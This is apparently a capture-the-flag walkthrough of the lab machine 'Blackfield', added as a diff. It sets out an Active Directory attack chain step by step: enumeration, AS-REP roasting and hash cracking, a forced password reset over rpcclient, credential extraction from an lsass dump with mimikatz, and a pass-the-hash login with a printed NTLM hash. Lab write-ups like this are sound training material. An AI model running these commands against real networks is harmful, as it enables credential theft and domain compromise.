@@ -1,0 +1,179 @@
+#########
+nonymous / Guest access to an SMB 
+Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack.
+Retrieve a hash of the encrypted material contained in the AS-REP
+Offline brute force attack in order to recover the plaintext password
+SMB share containing forensics artefacts, including an lsass process dump.
+WinRM privileges
+Dmp the Active Directory database
+Retrieve the hash of the primary domain administrator. 
+#########
+BlackFIled:
+
+1-Enumeration:
+    nmap -T5 -sV -sC -Pn 10.10.10.192  -oN enum/scan.log -vv
+    PORT     STATE SERVICE       REASON  VERSION
+    53/tcp   open  domain        syn-ack Simple DNS Plus
+    88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-02-22 23:57:12Z)
+    135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+    389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+    445/tcp  open  microsoft-ds? syn-ack
+    593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+    3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+
+    Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+    | smb2-security-mode:
+    |   311:
+    |_    Message signing enabled and required
+
+ 
+
+SMB/LDAP:
+    Enumerate LDAP:
+        nmap -n -Pn -sV --script "ldap* and not brute" -p 389 10.10.10.192
+
+        rootDomainNamingContext: DC=BLACKFIELD,DC=local
+        ldapServiceName: BLACKFIELD.local:dc01$@BLACKFIELD.LOCAL
+        namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local 
+        dnsHostName: DC01.BLACKFIELD.local
+
+ 
+    Try RPC connection:
+    rpcclient -U "" -N 10.10.10.192
+
+    enum4linux -a -u "" -p "" 10.10.10.192
+    Domain Name: BLACKFIELD
+    Domain Sid: S-1-5-21-4194615774-2175524697-3563712290
+
+    Enumeration DNS:
+        nmap -Pn -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" 10.10.10.192
+
+    Enumerate SMB:
+        crackmapexec smb 10.10.10.192 -u "" -p "" --shares
+            SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+            SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\:
+            SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
+
+    
+    smbclient -L //10.10.10.192/
+        Password for [WORKGROUP\dsk75]:
+                Sharename       Type      Comment
+                ---------       ----      -------
+                ADMIN$          Disk      Remote Admin
+                C$              Disk      Default share
+                forensic        Disk      Forensic / Audit share.
+                IPC$            IPC       Remote IPC
+                NETLOGON        Disk      Logon server share
+                profiles$       Disk     
+                SYSVOL          Disk      Logon server share
+
+    We get access:
+        smbclient //10.10.10.192/profiles$
+        We find usernames in the profile$ we will use it for Kerbrute 
+
+    Kerbrute fint users account without "Pre auth"
+        kerbrute -domain blackfield.local -users users.txt -passwords passwd.txt -outpurfile ldapEnum.log 
+
+    We found 3 users  and 1 without Preauth:
+        audit2020
+        support  <----------- NOT PRAUTH 
+        svc_backup
+
+
+
+    NOT Pre-Auth Kerberos - ASREPRoast:
+        We will try to obtain a TGT Ticket via the support form our Enumeration - Because it seems that support do not require PREAUTH:
+
+            python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.192 blackfield.local/support -no-pass
+
+        [*] Getting TGT for support
+        
+        We past all the TGT Hash in a file to hashcat (ASREPRoast):
+            hashcat hash.hash /usr/share/wordlists/rockyou.txt -m 18200
+
+        We found the password for support 
+
+
+    We will test Enumeration Via rpcclient:
+        rpcclient -U "support" 10.10.10.192      
+            Password for [WORKGROUP\support]:
+            rpcclient $> enumdomusers
+                user:[Administrator] rid:[0x1f4]
+                user:[Guest] rid:[0x1f5]
+                user:[krbtgt] rid:[0x1f6]
+                user:[audit2020] rid:[0x44f]
+                user:[support] rid:[0x450]
+                user:[svc_backup] rid:[0x585]
+                user:[lydericlefebvre] rid:[0x586]
+
+            rpcclient $> enumdomgroups
+                group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+                group:[Domain Admins] rid:[0x200]
+                group:[Domain Users] rid:[0x201]
+                group:[Domain Guests] rid:[0x202]
+                group:[Domain Computers] rid:[0x203]
+                group:[Domain Controllers] rid:[0x204]
+                group:[Schema Admins] rid:[0x206]
+                group:[Enterprise Admins] rid:[0x207]
+                group:[Group Policy Creator Owners] rid:[0x208]
+                group:[Read-only Domain Controllers] rid:[0x209]
+                group:[Cloneable Domain Controllers] rid:[0x20a]
+                group:[Protected Users] rid:[0x20d]
+                group:[Key Admins] rid:[0x20e]
+                group:[Enterprise Key Admins] rid:[0x20f]
+                group:[DnsUpdateProxy] rid:[0x44e]
+            rpcclient $> 
+
+    We have access to SYSVOL on the SMB:
+        smbclient //10.10.10.192/SYSVOL -U'blackfield.local\support'
+
+*******************************************************************************
+    We Upload everything we can:
+        smb: \> mask ""
+        smb: \> recurse
+        smb: \> prompt
+        smb: \> mget *
+    We found Nothing special ......
+
+    We will try to set other users password via rpcclient:
+        rpcclient $> ssetuserinfo2 audit2020 23 '#00^BlackKnight'
+
+    It seems to work
+*******************************************************************************
+
+    Now we have access to the "forensic" SMB:
+        smbclient //10.10.10.192/forensic -U'blackfield.local\audit2020'
+            Password for [BLACKFIELD.LOCAL\audit2020]:
+        
+        We upload a lot of files - need to check into these....
+
+        We find a pretty interesting 'lsass.zip' heheehe
+
+        We will Unzip the file and we need a Windows Box to open the DUMP file via mimikatz
+            lssas.DMP 
+
+        In the right File PAth:
+            sekurlsa::minidump lsass.DMP 
+            sekurlsa::logonpasswords full 
+
+    We found the svc_backup NTLM Hash 
+
+2-Exploit:
+    $ evil-winrm -i 10.10.10.192 -u svc_backup  -H '9658d1d1dcd9250115e2205d9f48400d'
+
+    
+
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
